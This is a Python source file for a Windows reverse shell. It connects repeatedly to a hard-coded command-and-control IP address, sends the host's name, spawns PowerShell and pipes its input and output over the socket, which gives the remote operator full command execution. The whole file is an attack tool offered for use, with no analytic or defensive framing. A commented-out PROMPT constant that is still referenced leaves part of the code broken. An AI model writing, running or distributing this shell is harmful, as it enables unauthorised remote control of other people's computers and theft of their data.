import socket
import subprocess
import threading
import os
import time

HOST = "159.69.125.234"  # C2 IP
PORT = 443              # C2 port
#PROMPT = "PS C:\\Temp> "  # Fake prompt so handler knows command is done

def handle_output(proc, sock):
    """Send PowerShell output + prompt back to handler."""
    while True:
        try:
            data = proc.stdout.read(1)
            if not data:
                break
            sock.sendall(data)
            if data in [b"\n", b"\r"]:  # End of command
                sock.sendall(PROMPT.encode())
        except:
            break

def handle_input(proc, sock):
    """Receive commands and write to PowerShell stdin."""
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            if b"\n" in data:
                proc.stdin.write(data)
                proc.stdin.flush()
        except:
            break

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)

    while True:
        try:
            s.connect((HOST, PORT))
            break
        except:
            time.sleep(2)

    # Send hostname banner
    hostname = os.environ.get("COMPUTERNAME", "UNKNOWN")
    s.sendall(f"[{hostname}] >".encode())

    # Wait a bit before starting PowerShell
    time.sleep(1)

    # Spawn PowerShell
    p = subprocess.Popen(
        ["powershell.exe", "-NoProfile", "-NoLogo"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0
    )

    # Start threads for communication
    threading.Thread(target=handle_output, args=(p, s), daemon=True).start()
    threading.Thread(target=handle_input, args=(p, s), daemon=True).start()

    try:
        p.wait()
    finally:
        s.close()

if __name__ == "__main__":
    main()
